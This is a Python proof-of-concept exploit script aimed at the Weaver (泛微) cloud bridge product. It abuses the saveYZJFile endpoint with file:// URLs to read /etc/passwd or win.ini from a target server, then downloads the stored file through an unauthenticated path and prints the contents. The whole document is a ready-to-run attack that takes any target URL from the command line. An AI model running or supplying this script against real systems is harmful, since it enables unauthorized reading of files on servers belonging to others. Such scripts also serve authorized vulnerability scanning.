import requests
from random import choice
import sys
import json

headers={

    }

def run(url):
    payload1 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt'
    payload2 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://c:/windows/win.ini&fileExt=txt'
    url1 = url+payload1
    url2 = url+payload2
    #print(url1,url2)
    try:
        res1=requests.get(url=url1,verify=False).text
        res2=requests.get(url=url2,verify=False).text
        #print(res1)
        if 'id'  in res2:
            res=res2
            #print(res)
        else:
            if 'id'  in res1:
                res=res1
            else:
                print('这个PoC不适合这个系统，别试了')

        print_data= {

                "name":"泛微云桥任意文件读取",
                "level":"3",
                "request":"",
                "response":requests.get(url=url+'/file/fileNoLogin/'+json.loads(res)['id'],verify=False).text,
            }

        print(print_data)

    except BaseException:
        print('这个PoC不适合这个系统，别试了')

if __name__ == "__main__":
    url= sys.argv[1]
    url=url.rstrip('/')
    run(url)
